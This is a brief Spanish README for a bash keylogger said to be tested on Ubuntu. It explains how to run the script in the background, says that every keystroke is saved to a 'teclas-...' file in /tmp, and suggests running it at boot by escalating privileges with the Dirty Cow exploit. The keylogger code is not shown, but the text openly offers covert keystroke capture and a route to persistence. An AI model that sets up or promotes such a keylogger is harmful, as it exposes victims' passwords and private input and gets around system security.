# bash_keylogger (probado en Ubuntu)
keylogger en bash se debe ejecutar en background:

./keylogger_bash & 


el fichero que intercepta todo lo pulsado se genera en /tmp con nombre "teclas-..."
Puedes hacer q funcione como un servicio en el arranque, consiguiendo una escalada de privilegios con Dirty Cow
